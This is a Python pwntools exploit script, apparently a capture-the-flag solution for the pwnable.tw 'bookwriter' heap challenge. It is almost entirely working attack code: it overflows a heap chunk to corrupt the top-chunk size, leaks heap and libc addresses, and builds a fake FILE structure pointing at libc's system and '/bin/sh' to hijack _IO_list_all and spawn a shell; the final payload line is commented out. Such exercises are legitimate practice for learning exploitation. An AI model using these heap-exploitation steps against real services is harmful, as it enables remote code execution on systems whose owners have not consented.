#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = "./bookwriter"
ip = "chall.pwnable.tw"
port = 10304

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc_64.so.6"
if LOCAL:
    io = process(filename, env={'LD_PRELOAD': remote_libc})
    # io = gdb.debug(filename, "set  follow-fork-mode child\nb free\nc", )
    # io = gdb.debug(filename, "set  follow-fork-mode child\nset exec-wrapper env 'LD_PRELOAD=./libc_2.27.so'\nb *0x555555554ECA\n", )
    # libc = ELF("/home/pu1p/glibcs/glibc-2.27_out/lib/libc-2.27.so")
    # libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process(filename, env={'LD_PRELOAD': remote_libc}) 
    libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)
    # libc = elf.libc

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "Your choice :", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

def add(io, size, con=''):
    choice(io, 1)
    sla(io, "Size of page :", str(size))
    if size != 0:
        sa(io, "Content :", con)

def show(io, idx):
    choice(io, 2)
    sla(io, "Index of page :", str(idx))

def edit(io, idx, con):
    choice(io, 3)
    sla(io, "Index of page :", str(idx))
    sa(io, "Content:", con)

def info(io, ch, con=''):
    choice(io, 4)
    sla(io, "Do you want to change the author ? (yes:1 / no:0) ", ch)
    if ch == b'1':
        sa(io, "Author :", con)

# bps.append("*0x5555555559CB")  
gds['data']=0x6020A0

# mydebug(io, )
sa(io, "Author :", b'a'*0x40)

add(io, 0) # 0
add(io, 0x18, b'a') # 1
edit(io, 1, b'a'*0x18)
edit(io, 1, b'a'*0x18 + b'\xc1\x1f\x00')

choice(io, 4)
ru(io, b"a"*0x40)
heap_addr = u32(io.recvline().strip().ljust(4, b'\x00'))

sla(io, "Do you want to change the author ? (yes:1 / no:0) ", '0')

add(io, 0x1000, b'b'*0x8)   # 2

add(io, 0x10, b'a')   # 3
show(io, 3)
ru(io, "Content :\n")
libc_addr = u64(rv(io, 6) + b'\x00\x00') - 0x61
libc.address = libc_base = libc_addr - 0x3c4100

# input()

for i in range(5):
    add(io, 0)

log.info("libc_addr :0x%x", libc_addr)
log.info("libc_base :0x%x", libc_base)
log.info("heap_addr :0x%x", heap_addr)
# input()


pay = flat(2, 3) + p64(0) * 9 + p64(libc.sym['system'])

pay += p64(0) * 11 + p64(heap_addr + 0x20be170 - 0x20bd010)

# edit(io, 0, b'\x00'*0x18 + p64(0x10f1) + b'b'*0x10e0 + b"/bin/sh\x00" + p64(0x61) + p64(libc_addr - 0x588) + p64(libc.sym['_IO_list_all']-0x10) + pay)

# add(io, 0)   # 8

edit(io, 0, b'\x00'*0xf00)


io.interactive()
